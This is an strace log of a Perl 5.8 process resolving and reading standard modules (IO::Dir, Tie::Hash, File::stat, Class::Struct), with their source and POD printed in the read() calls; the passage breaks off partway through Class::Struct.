10004 07:30:53.742040 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
10004 07:30:53.742061 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
10004 07:30:53.742076 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed958) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.742087 _llseek(6, 0, [0], SEEK_CUR) = 0
10004 07:30:53.742106 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
10004 07:30:53.742432 stat64("/etc/perl/Tie/Hash.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.742450 stat64("/etc/perl/Tie/Hash.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.742464 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.742476 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.742490 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.742503 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.742520 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.742532 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.742545 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.742557 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.742570 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.742582 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.742595 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.742608 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
10004 07:30:53.742629 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
10004 07:30:53.742643 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed4a8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.742654 _llseek(8, 0, [0], SEEK_CUR) = 0
10004 07:30:53.742673 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
10004 07:30:53.743143 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
10004 07:30:53.743749 read(8, "", 4096) = 0
10004 07:30:53.743777 close(8)          = 0
10004 07:30:53.743854 stat64("/etc/perl/File/stat.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.743869 stat64("/etc/perl/File/stat.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.743883 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.743895 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.743910 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.743923 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.743937 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.743948 stat64("/usr/lib/perl5/File/stat.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.743961 stat64("/usr/share/perl5/File/stat.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.743973 stat64("/usr/share/perl5/File/stat.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.743987 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.743999 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.744013 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.744026 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
10004 07:30:53.744047 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
10004 07:30:53.744062 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed4a8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.744073 _llseek(8, 0, [0], SEEK_CUR) = 0
10004 07:30:53.744090 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
10004 07:30:53.744551 stat64("/etc/perl/Class/Struct.pmc", 0xbfeed2dc) = -1 ENOENT (No such file or directory)
10004 07:30:53.752417 stat64("/etc/perl/Class/Struct.pm", 0xbfeed1ec) = -1 ENOENT (No such file or directory)
10004 07:30:53.752417 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfeed2dc) = -1 ENOENT (No such file or directory)
10004 07:30:53.752417 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfeed1ec) = -1 ENOENT (No such file or directory)
10004 07:30:53.752418 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfeed2dc) = -1 ENOENT (No such file or directory)
10004 07:30:53.752418 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfeed1ec) = -1 ENOENT (No such file or directory)
10004 07:30:53.752418 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfeed2dc) = -1 ENOENT (No such file or directory)
10004 07:30:53.752418 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfeed1ec) = -1 ENOENT (No such file or directory)
10004 07:30:53.752428 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfeed2dc) = -1 ENOENT (No such file or directory)
10004 07:30:53.752440 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfeed1ec) = -1 ENOENT (No such file or directory)
10004 07:30:53.752454 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfeed2dc) = -1 ENOENT (No such file or directory)
10004 07:30:53.752467 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfeed1ec) = -1 ENOENT (No such file or directory)
10004 07:30:53.752480 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfeed2dc) = -1 ENOENT (No such file or directory)
10004 07:30:53.752497 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
10004 07:30:53.752519 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
10004 07:30:53.752534 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeecff8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.752545 _llseek(10, 0, [0], SEEK_CUR) = 0
10004 07:30:53.752569 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
10004 07:30:53.753011 brk(0x82de000)    = 0x82de000
10004 07:30:53.753415 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined 